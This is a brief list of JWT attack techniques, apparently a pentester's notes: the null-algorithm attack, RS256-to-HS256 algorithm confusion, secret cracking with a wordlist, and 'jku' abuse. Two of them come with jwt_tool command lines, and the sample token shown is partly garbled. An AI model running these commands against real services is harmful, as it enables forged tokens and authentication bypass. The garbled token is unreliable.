1. `null` attack
2. Algorithm Switch Attack: from `RS256` to `HS256`, use public key as encryption key for `HS256`: `jwt_tool eyJBeXAiOiJKV1QiLCJhbGciOiJSUZI1Ni.eyJpc3MiOi JodHRwOlwvxC9kZW1vLnNqb2VyZGxhbm drzwiwZXIubmxcLyIsIm1hdCI6MTYYCJkYXRhIjp7ImhlbGxvijoid29ybGQifx0.MBZKIR......we_n7POBISAZYSMayihlweg -x k-pk public-key-pem`
3. JWT crack `jwt_tool <JWT Token> -C -d /wordlist.txt` 
4. `jku` 